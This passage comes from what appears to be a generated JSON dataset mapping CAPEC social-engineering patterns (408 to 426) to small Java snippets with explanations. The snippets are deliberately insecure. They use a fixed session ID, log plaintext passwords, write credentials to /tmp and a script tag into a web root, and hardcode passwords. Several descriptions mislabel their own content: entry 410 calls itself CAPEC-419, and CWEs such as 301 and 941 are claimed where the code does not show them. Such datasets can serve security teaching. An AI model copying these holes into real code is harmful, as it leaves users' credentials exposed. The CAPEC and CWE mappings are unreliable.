        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PretextingExample {\n    private static Map<String, String> userSessions = new HashMap<>();\n    private static Map<String, String> userData = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user login\n        String sessionId = loginUser(\"user1\", \"password123\");\n        System.out.println(\"User logged in with session ID: \" + sessionId);\n\n        // Adversary pretexting as a system admin\n        String adversarySessionId = \"fixedSessionId\";\n        userSessions.put(\"admin\", adversarySessionId);\n        System.out.println(\"Adversary logged in with session ID: \" + adversarySessionId);\n\n        // Adversary accessing sensitive information\n        String sensitiveInfo = getUserData(adversarySessionId, \"user1\");\n        System.out.println(\"Adversary accessed sensitive information: \" + sensitiveInfo);\n    }\n\n    private static String loginUser(String username, String password) {\n        // Insecure session fixation vulnerability\n        String sessionId = \"fixedSessionId\";\n        userSessions.put(username, sessionId);\n        userData.put(username, \"Sensitive Information of \" + username);\n        return sessionId;\n    }\n\n    private static String getUserData(String sessionId, String targetUser) {\n        // Insecure channel and exposure of sensitive information\n        if (userSessions.containsValue(sessionId)) {\n            return userData.get(targetUser);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a pretexting attack where an adversary manipulates a session fixation vulnerability to gain unauthorized access to sensitive information. The `loginUser` method simulates a user login but uses a fixed session ID, representing CWE-384 (Session Fixation). The adversary then pretexts as a system admin and uses the fixed session ID to access sensitive information of another user, demonstrating CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-300 (Channel Accessible by Non-Endpoint). The code highlights how an adversary can exploit these vulnerabilities to perform a pretexting attack, aligning with the CAPEC description."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            // Simulate some operations\n            int result = performSensitiveOperation(sensitiveData);\n            logger.log(Level.INFO, \"Operation result: {0}\", result);\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"An error occurred: {0}\", e.getMessage());\n        }\n    }\n\n    private static int performSensitiveOperation(String data) throws IOException {\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(\"log.txt\", true)) {\n            writer.write(\"Sensitive data: \" + data + \"\\n\");\n        }\n        return data.length();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to information exposure through log files (CWE-532). The code logs sensitive data (a user password) to a file and also logs operation results and errors using a logger. This represents the deprecated CAPEC pattern of information gathering from traditional sources, where sensitive information can be inadvertently exposed through improper logging practices. The code highlights the risk of exposing sensitive data through debug or server log files, which can be exploited by attackers to gather information."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            String sensitiveData = \"User password: mySecretPassword123\";\n            logger.info(sensitiveData);\n\n            // Write sensitive data to a file\n            FileWriter writer = new FileWriter(\"debug.log\", true);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server and debug log files. The code sets up a logger to write logs to a file named 'server.log' and also writes sensitive data directly to a file named 'debug.log'. This represents the deprecated CAPEC pattern of 'Information Gathering from Non-Traditional Sources' and related CWEs such as CWE-532 (Information Exposure Through Log Files). The main idea is to show how sensitive information can be inadvertently exposed through improper logging practices."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InformationElicitation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a login process\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful!\");\n            // Expose sensitive information\n            System.out.println(\"Your secret token is: \" + getSecretToken(username));\n        } else {\n            System.out.println(\"Login failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n\n    private static String getSecretToken(String username) {\n        // Dummy method to return a secret token\n        return \"SECRET_TOKEN_12345\";\n    }\n}",
        "description": "This Java code snippet demonstrates a simple login process that is vulnerable to information elicitation attacks. The code asks for a username and password, and if the authentication is successful, it exposes a sensitive piece of information (a secret token). This example embodies the main idea of CAPEC-419 (Information Elicitation) by showing how an adversary could extract sensitive information through social engineering. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The secret token is exposed without proper authorization checks.\n- CWE-940 (Improper Verification of Source of a Communication Channel): The code does not verify the source of the communication channel, making it susceptible to attacks.\n- CWE-205 and CWE-207 (Observable Behavioral Discrepancy): The code's behavior (successful login message) can be observed and used to infer sensitive information.\n- CWE-222 (Truncation of Security-relevant Information): Although not directly shown, truncation issues could arise if the secret token or other information is mishandled."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Simulate logging sensitive information\n            String sensitiveData = \"User: admin, Password: admin123\";\n            logger.info(\"Sensitive data: \" + sensitiveData);\n\n            // Simulate writing sensitive data to a debug log file\n            FileWriter debugLog = new FileWriter(\"debug.log\", true);\n            debugLog.write(\"Debug info: \" + sensitiveData + \"\\n\");\n            debugLog.close();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server and debug log files. The code sets up a logger to write to a 'server.log' file and also writes sensitive data directly to a 'debug.log' file. This embodies the main idea of the deprecated CAPEC related to information exposure through log files (CWE-532). The code highlights the risk of logging sensitive information, which can be exploited by attackers to gather sensitive data through pretexting or other social engineering techniques."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import java.util.Scanner;\n\npublic class CustomerServicePretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to Customer Service. Please enter your credit card number for verification:\");\n        String creditCardNumber = scanner.nextLine();\n        \n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyCreditCard(creditCardNumber)) {\n            System.out.println(\"Thank you for verifying your credit card number.\");\n        } else {\n            System.out.println(\"Invalid credit card number.\");\n        }\n    }\n\n    private static boolean verifyCreditCard(String creditCardNumber) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // This is a mock verification function that does not actually verify the source\n        return creditCardNumber.length() == 16;\n    }\n}",
        "description": "This Java code snippet simulates a customer service interaction where a user is prompted to enter their credit card number for verification. The main idea of the CAPEC is represented by the adversary assuming the role of customer service to solicit sensitive information. The code demonstrates several related CWEs: CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the request, CWE-300 (Channel Accessible by Non-Endpoint) by not ensuring the integrity of the communication channel, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive information without proper authorization. The `verifyCreditCard` function is a mock function that does not perform any real verification, highlighting the vulnerability."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class TechSupportPretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Tech Support: Please enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Tech Support: Please enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Thank you! Your credentials have been recorded.\");\n\n        // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n        try {\n            File file = new File(\"/tmp/credentials.txt\");\n            FileWriter writer = new FileWriter(file, true);\n            writer.write(\"Username: \" + username + \", Password: \" + password + \"\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        System.out.println(\"Tech Support: Please upload the diagnostic file:\");\n        String filePath = scanner.nextLine();\n        File uploadedFile = new File(filePath);\n        if (uploadedFile.exists()) {\n            System.out.println(\"File uploaded successfully.\");\n        } else {\n            System.out.println(\"File upload failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a tech support pretexting attack. The program prompts the user to enter their username and password, which are then stored in a publicly accessible file, demonstrating CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory). Additionally, the program asks the user to upload a diagnostic file without any validation, representing CWE-434 (Unrestricted Upload of File with Dangerous Type). This code embodies the main idea of the CAPEC by showing how an adversary can solicit sensitive information and manipulate the target into performing actions that compromise security."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class DeliveryPersonPretexting {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://example.com/delivery\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n            File sensitiveFile = new File(\"/var/www/html/sensitive_info.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(sensitiveFile))) {\n                writer.write(\"Sensitive Information: User credentials\");\n            }\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (conn.getResponseCode() == 200) {\n                System.out.println(\"Delivery request sent successfully.\");\n            } else {\n                System.out.println(\"Failed to send delivery request.\");\n            }\n\n            // CWE-433: Unparsed Raw Web Content Delivery\n            File rawContent = new File(\"/var/www/html/raw_content.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(rawContent))) {\n                writer.write(\"<script>alert('This is raw content');</script>\");\n            }\n\n            // CWE-1292: Incorrect Conversion of Security Identifiers\n            String securityIdentifier = convertSecurityIdentifier(\"untrusted_input\");\n            System.out.println(\"Security Identifier: \" + securityIdentifier);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String convertSecurityIdentifier(String input) {\n        // Incorrect conversion logic\n        return \"SECURE_\" + input;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where an adversary, posing as a delivery person, exploits various vulnerabilities to solicit information or manipulate the target. The code demonstrates the following vulnerabilities:\n\n1. **CWE-941**: The URL for the delivery request is hardcoded and may not be correctly specified, leading to potential misdirection.\n2. **CWE-538**: Sensitive information is written to a file in a web-accessible directory, making it accessible to unauthorized actors.\n3. **CWE-300**: The code does not verify the identity of the endpoints in the communication channel, allowing unauthorized access.\n4. **CWE-433**: Raw web content is stored under the web document root without proper parsing, which could lead to script injection attacks.\n5. **CWE-1292**: The conversion of security identifiers is incorrectly implemented, potentially allowing untrusted agents to gain unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to perform pretexting and gain unauthorized access or information."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import java.util.Scanner;\n\npublic class PretextingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the Help Desk. Please enter your employee ID:\");\n        String employeeId = scanner.nextLine();\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyEmployeeId(employeeId)) {\n            System.out.println(\"Please enter your password:\");\n            String password = scanner.nextLine();\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (authenticate(employeeId, password)) {\n                System.out.println(\"Authentication successful. How can we assist you today?\");\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Your account balance is $10,000.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } else {\n            System.out.println(\"Invalid employee ID.\");\n        }\n    }\n\n    private static boolean verifyEmployeeId(String employeeId) {\n        // Simulate verification process\n        return employeeId.equals(\"12345\");\n    }\n\n    private static boolean authenticate(String employeeId, String password) {\n        // Simulate authentication process\n        return employeeId.equals(\"12345\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet simulates a help desk scenario where an adversary could engage in pretexting via phone. The code demonstrates improper verification of the source of a communication channel (CWE-940) by not adequately verifying the employee ID. It also shows a channel accessible by a non-endpoint (CWE-300) by not securing the communication channel. Finally, it exposes sensitive information (CWE-200) by displaying the account balance without proper authorization. This example highlights the vulnerabilities that can be exploited in a social engineering attack, where an adversary impersonates a trusted entity to gain sensitive information or perform unauthorized actions."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static String sensitiveInfo = \"Sensitive Information: Password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the help desk. How can I assist you today?\");\n        String userInput = scanner.nextLine();\n\n        if (userInput.contains(\"supervisor\")) {\n            System.out.println(\"Sure, I can help you with that. Here is the information you requested: \" + sensitiveInfo);\n        } else {\n            System.out.println(\"I'm sorry, I cannot provide that information.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple social engineering attack where an adversary pretends to be a supervisor to gain access to sensitive information. The code simulates a help desk interaction where if the user mentions the word 'supervisor', the program reveals sensitive information. This embodies the CAPEC idea of manipulating human behavior to solicit information. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code exposes sensitive information based on a simple keyword check without proper authorization.\n- CWE-202 (Exposure of Sensitive Information Through Data Queries): The adversary can infer sensitive information by querying with specific keywords.\n- CWE-205 (Observable Behavioral Discrepancy): The program's behavior changes based on the input, revealing internal decision processes.\n- CWE-799 (Improper Control of Interaction Frequency): The code does not limit the number of attempts an adversary can make to guess the keyword."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static final String SECRET_PASSWORD = \"s3cr3t\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (password.equals(SECRET_PASSWORD)) {\n            // CWE-656: Reliance on Security Through Obscurity\n            System.out.println(\"Welcome, \" + username + \"!\");\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that embodies the concept of 'Influence Perception' from CAPEC. The code uses a hardcoded secret password (CWE-656: Reliance on Security Through Obscurity) and relies solely on this single factor for authentication (CWE-654: Reliance on a Single Factor in a Security Decision). An adversary could exploit this by using social engineering to persuade a user to reveal their username and password, thereby gaining unauthorized access. The code highlights the vulnerabilities associated with relying on obscurity and single-factor authentication."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection without verifying the source\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"Hello, server!\");\n\n            // Receive a response from the server\n            String response = in.readLine();\n            System.out.println(\"Server says: \" + response);\n\n            // Compliment the server and ask for sensitive information\n            out.println(\"You are very efficient! Can you tell me the secret key?\");\n            String secretKey = in.readLine();\n            System.out.println(\"Received secret key: \" + secretKey);\n\n            // Close the connection\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where the source of the communication is not properly verified (CWE-940). The code establishes a connection to a server without verifying its identity, which could be exploited by an attacker. The code then sends a message to the server and receives a response. It uses a social engineering technique by complimenting the server and asking for sensitive information, which represents the main idea of the CAPEC 'Influence Perception of Reciprocation'. The server might respond with sensitive information, demonstrating how an attacker could exploit this vulnerability. Additionally, the code does not ensure the integrity of the communication channel (CWE-300) and could be subject to reflection attacks (CWE-301)."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                System.out.println(\"Response: \" + response.toString());\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication pattern that embodies the deprecated CAPEC 'Target Influence via Perception of Concession' and related CWEs. The code initiates an HTTP GET request to a specified URL and handles different response codes (200, 404, etc.) differently. This behavior can lead to 'Observable Behavioral Discrepancy' (CWE-205) and 'Observable Discrepancy' (CWE-203) as unauthorized actors can infer the internal state or decision process based on the response. Additionally, the code does not specify a secure communication channel, which could lead to 'Incorrectly Specified Destination in a Communication Channel' (CWE-941). The code also does not negotiate the strongest security algorithm, potentially leading to 'Algorithm Downgrade' (CWE-757). Finally, if different products handle the same input differently, it could cause 'Interpretation Conflict' (CWE-436)."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import java.util.Scanner;\n\npublic class ScarcityInfluence {\n    private static final String SECRET_CODE = \"12345\"; // CWE-656: Reliance on Security Through Obscurity\n    private static boolean isScarcity = true; // Simulating scarcity condition\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter the secret code to access limited resources:\");\n        String userInput = scanner.nextLine();\n\n        if (isScarcity) { // CWE-654: Reliance on a Single Factor in a Security Decision\n            if (userInput.equals(SECRET_CODE)) {\n                System.out.println(\"Access granted to limited resources!\");\n            } else {\n                System.out.println(\"Access denied. Incorrect code.\");\n            }\n        } else {\n            System.out.println(\"Resources are not scarce. No need for a code.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Scarcity' by simulating a scenario where access to resources is controlled based on a perceived scarcity condition. The code uses a hardcoded secret code (CWE-656: Reliance on Security Through Obscurity) to grant access, which is a weak security practice. The decision to grant access is based solely on the scarcity condition and the correctness of the secret code (CWE-654: Reliance on a Single Factor in a Security Decision). This creates a sense of urgency and pressure on the user to input the correct code to gain access to the limited resources."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful. Please enter the sensitive information:\");\n            String sensitiveInfo = scanner.nextLine();\n            System.out.println(\"Sensitive Information: \" + sensitiveInfo);\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // This is a simplified authentication check for demonstration purposes\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks, specifically impersonation, as described in the CAPEC. The code asks the user for a username and password, and if the credentials match hardcoded values, it prompts the user to enter sensitive information. The code embodies several related CWEs: \n- CWE-654: The authentication relies on a single factor (username and password) without additional verification.\n- CWE-300 and CWE-940: The authentication process does not verify the integrity or source of the communication channel, making it susceptible to impersonation attacks.\nThis example highlights how an adversary could impersonate an authority figure to gain access to sensitive information by exploiting weak authentication mechanisms."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    private int requestCount = 0;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userAction = request.getParameter(\"action\");\n        String userId = request.getParameter(\"userId\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (userId == null || userId.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid user ID\");\n            return;\n        }\n\n        // CWE-799: Improper Control of Interaction Frequency\n        requestCount++;\n        if (requestCount > 100) {\n            response.sendError(HttpServletResponse.SC_TOO_MANY_REQUESTS, \"Too many requests\");\n            return;\n        }\n\n        // CWE-203: Observable Discrepancy\n        if (\"minorTask\".equals(userAction)) {\n            response.getWriter().println(\"Minor task completed\");\n        } else if (\"majorTask\".equals(userAction)) {\n            response.getWriter().println(\"Major task completed\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Unknown action\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary could use social engineering to influence a user's actions. The servlet processes HTTP GET requests and performs actions based on the 'action' parameter. The code includes several vulnerabilities:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The code does not properly verify the source of the request, only checking if the 'userId' parameter is present.\n\n2. **CWE-799: Improper Control of Interaction Frequency** - The code counts the number of requests but does not implement a robust mechanism to limit the frequency of interactions effectively.\n\n3. **CWE-203: Observable Discrepancy** - The servlet's responses reveal different behaviors based on the 'action' parameter, which could be observed by an unauthorized actor to infer the internal state or decision process of the application.\n\nThe main idea of the CAPEC is represented by the adversary's ability to influence the user to perform minor tasks ('minorTask') and then escalate to major tasks ('majorTask'), leveraging the observable discrepancies and improper controls in the system."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableAuth {\n    private static String trustedUser = \"admin\";\n    private static String trustedPassword = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (username.equals(trustedUser) && password.equals(trustedPassword)) {\n            return true;\n        }\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        if (username.equals(trustedUser)) {\n            System.out.println(\"Hint: Try using the same password as the username.\");\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication mechanism that embodies the main idea of CAPEC-Influence Perception of Liking. The code attempts to build a relationship with the user by providing hints (CWE-301) when the username matches the trusted user but the password does not. This can make the user feel more 'liked' or 'trusted' by the system, potentially influencing their actions. The authentication mechanism relies on a single factor (CWE-654), making it weak and easily exploitable. The code also hints at the use of security through obscurity (CWE-656) by relying on the secrecy of the password, which is easily guessable. Overall, the code represents how an adversary might influence a target by ingratiating themselves through seemingly helpful actions, while exploiting weak security practices."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialProofVulnerability {\n    private static boolean isAdmin = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n\n        if (username.equals(\"admin\")) {\n            isAdmin = true;\n        }\n\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        if (isAdmin && password.equals(\"admin123\")) {\n            System.out.println(\"Welcome, admin!\");\n        } else if (!isAdmin && password.equals(\"user123\")) {\n            System.out.println(\"Welcome, user!\");\n        } else {\n            System.out.println(\"Invalid credentials.\");\n        }\n\n        // Observable discrepancy\n        if (isAdmin) {\n            System.out.println(\"Admin mode enabled.\");\n        } else {\n            System.out.println(\"User mode enabled.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Influence Perception of Consensus or Social Proof' by leveraging observable discrepancies (CWE-203, CWE-205) and reliance on a single factor in a security decision (CWE-654). The code asks for a username and password, and based on the username, it sets an 'isAdmin' flag. The password check is then performed based on this flag. The observable discrepancy is introduced by printing different messages based on the 'isAdmin' flag, which can be exploited by an attacker to infer the internal state of the application. This can influence the target's actions by making them believe that certain behaviors (like entering 'admin' as the username) are appropriate or expected, thus leveraging social proof."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import java.util.Scanner;\n\npublic class FramingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome! Please enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Great! Now, please enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful! Would you like to enable two-factor authentication? (yes/no)\");\n            String response = scanner.nextLine();\n            if (response.equalsIgnoreCase(\"no\")) {\n                System.out.println(\"No problem! You can always enable it later.\");\n            } else {\n                System.out.println(\"Two-factor authentication enabled.\");\n            }\n        } else {\n            System.out.println(\"Login failed. Please try again.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate authentication process\n        return \"user\".equals(username) && \"pass\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple login system that embodies the concept of 'Target Influence via Framing' (CAPEC). The code uses framing techniques to influence the user's decision-making process. After a successful login, the user is asked if they want to enable two-factor authentication. If the user responds with 'no', the system frames the response positively by saying 'No problem! You can always enable it later.' This avoids a negative response and subtly encourages the user to consider enabling it in the future. The code also highlights CWE-654 by relying solely on username and password for authentication, which is a single factor security decision. The code is concise and represents the main idea of using framing to influence user behavior while also touching on related security weaknesses."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IncentiveInfluence {\n    private static Map<String, Integer> userPoints = new HashMap<>();\n    private static final int REWARD_THRESHOLD = 100;\n\n    public static void main(String[] args) {\n        String userId = \"user123\";\n        int points = getUserPoints(userId);\n        if (points >= REWARD_THRESHOLD) {\n            System.out.println(\"Congratulations! You've earned a reward.\");\n            // CWE-1229: Creation of Emergent Resource\n            grantReward(userId);\n        } else {\n            System.out.println(\"Keep going! Earn more points to get a reward.\");\n        }\n    }\n\n    private static int getUserPoints(String userId) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return userPoints.getOrDefault(userId, 0);\n    }\n\n    private static void grantReward(String userId) {\n        // CWE-405: Asymmetric Resource Consumption (Amplification)\n        System.out.println(\"Reward granted to \" + userId);\n        // CWE-656: Reliance on Security Through Obscurity\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        sendRewardNotification(userId);\n    }\n\n    private static void sendRewardNotification(String userId) {\n        // Simulate sending a notification\n        System.out.println(\"Notification sent to \" + userId);\n    }\n}",
